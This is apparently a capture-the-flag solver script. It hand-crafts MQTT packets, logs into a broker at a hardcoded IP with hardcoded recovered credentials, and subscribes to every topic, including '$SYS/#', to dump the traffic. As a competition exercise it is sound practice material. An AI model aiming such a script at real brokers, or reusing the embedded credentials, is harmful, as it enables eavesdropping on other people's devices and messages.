import socket
import struct
import time

def mqtt_connect(client_id, username=None, password=None):
    # Variable Header:
    # Protocol Name length: 00 04
    # Protocol Name: MQTT
    # Level: 04 (3.1.1)
    # Connect Flags: 02 (Clean Session)
    #   Bit 7: Username
    #   Bit 6: Password
    # Keep Alive: 00 3c (60s)
    
    flags = 0x02
    if username: flags |= 0x80
    if password: flags |= 0x40
    
    var_header = b'\x00\x04MQTT\x04' + bytes([flags]) + b'\x00\x3c'
    
    # Payload:
    # Client ID length, Client ID
    payload = struct.pack("!H", len(client_id)) + client_id.encode()
    if username:
        payload += struct.pack("!H", len(username)) + username.encode()
    if password:
        payload += struct.pack("!H", len(password)) + password.encode()
    
    rem_len = len(var_header) + len(payload)
    
    # Remaining Length can be multi-byte, but here it should be fine as single byte
    # if rem_len < 128
    fixed_header = b'\x10' + bytes([rem_len]) 
    
    return fixed_header + var_header + payload

def mqtt_subscribe(topic):
    var_header = b'\x00\x01' # Packet ID
    payload = struct.pack("!H", len(topic)) + topic.encode() + b'\x00' # QoS 0
    rem_len = len(var_header) + len(payload)
    fixed_header = b'\x82' + bytes([rem_len])
    return fixed_header + var_header + payload

def solve():
    server = "51.210.244.18"
    port = 1883
    
    print("[*] Reconnecting with credentials...")
    s = socket.create_connection((server, port), timeout=10)
    
    user = "hackday"
    # Wait, the credentials might be corrupted. 
    # hackday:1Bc2Mk0rlevzuCG6AaDK6Opa
    # The message says 1Bc2Mk0rlevzuCG6AaDK6Opa
    # Let's try it.
    pwd = "1Bc2Mk0rlevzuCG6AaDK6Opa"
    
    s.sendall(mqtt_connect("ctf-authed", user, pwd))
    connack = s.recv(4)
    print(f"[*] Connack: {connack.hex()}")
    
    if len(connack) >= 4 and connack[3] == 0:
        print("[+] Auth Successful!")
    else:
        print("[-] Auth Failed")
        # Try without password if failed?
    
    s.sendall(mqtt_subscribe("#"))
    s.sendall(mqtt_subscribe("$SYS/#"))
    
    try:
        while True:
            data = s.recv(4096)
            if not data: break
            # Parse simple PUBLISH
            # 0x30 ...
            print(f"[*] Data: {data.hex()}")
            try:
                print(f"[*] Text: {data.decode(errors='ignore')}")
            except: pass
    except: pass
    finally:
        s.close()

if __name__ == "__main__":
    solve()
